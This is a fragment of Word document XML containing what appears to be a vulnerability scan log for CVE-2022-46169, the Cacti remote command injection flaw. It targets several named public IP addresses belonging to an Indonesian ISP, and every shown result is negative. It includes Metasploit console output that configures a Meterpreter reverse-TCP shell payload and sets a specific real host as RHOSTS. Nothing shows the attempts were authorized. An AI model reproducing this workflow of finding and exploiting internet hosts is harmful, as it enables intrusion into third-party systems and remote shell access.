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202.169.33.63</w:t>
        <w:br/>
        <w:t>202.169.33.81</w:t>
        <w:br/>
        <w:t>182.253.224.58</w:t>
        <w:br/>
        <w:t>182.253.23.12</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- 202.169.33.63: No CVE-2022-46169 Vulnerability Detected</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- 202.169.33.81: No CVE-2022-46169 Vulnerability Detected</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- 182.253.224.58: No CVE-2022-46169 Vulnerability Detected</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- 182.253.23.12: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202.169.33.63</w:t>
        <w:tab/>
        <w:t>80</w:t>
        <w:tab/>
        <w:t>Biznet Networks</w:t>
        <w:tab/>
        <w:tab/>
        <w:t>2024-07-05T07:31:36.557543</w:t>
        <w:tab/>
        <w:br/>
        <w:t>202.169.33.81</w:t>
        <w:tab/>
        <w:t>80</w:t>
        <w:tab/>
        <w:t>Biznet Networks</w:t>
        <w:tab/>
        <w:tab/>
        <w:t>2024-07-05T06:25:07.433497</w:t>
        <w:tab/>
        <w:br/>
        <w:t>182.253.224.58</w:t>
        <w:tab/>
        <w:t>80</w:t>
        <w:tab/>
        <w:t>Biznet Networks</w:t>
        <w:tab/>
        <w:tab/>
        <w:t>2024-07-04T02:19:28.700079</w:t>
        <w:tab/>
        <w:br/>
        <w:t>182.253.23.12</w:t>
        <w:tab/>
        <w:t>80</w:t>
        <w:tab/>
        <w:t>Biznet Networks</w:t>
        <w:tab/>
        <w:tab/>
        <w:t>2024-07-01T20:24:07.162072</w:t>
        <w:tab/>
        <w:br/>
        <w:t>103.150.191.137</w:t>
        <w:tab/>
        <w:t>80</w:t>
        <w:tab/>
        <w:t>PT Biznet Gio Nusantara</w:t>
        <w:tab/>
        <w:tab/>
        <w:t>2024-06-29T19:46:16.618308</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202.169.33.63 </w:t>
        <w:br/>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202.169.33.81 </w:t>
        <w:br/>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182.253.224.58 </w:t>
        <w:br/>
        <w:br/>
        <w:t>This copy of metasploit-framework is more than two weeks old.</w:t>
        <w:br/>
        <w:t xml:space="preserve"> Consider running 'msfupdate' to update to the latest version.</w:t>
        <w:br/>
        <w:t>[*] Using configured payload linux/x86/meterpreter/reverse_tcp</w:t>
        <w:br/>
        <w:t>RHOSTS =&gt; 182.253.224.58</w:t>
        <w:br/>
        <w:t>RPORT =&gt; 80</w:t>
        <w:br/>
        <w:t>[*] 182.253.224.58:80 - The target is not exploitable. Target is not a Cacti application.</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">========== Vulnerability Scan Result for 182.253.23.12 </w:t>
        <w:br/>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103.150.191.137 </w:t>
        <w:br/>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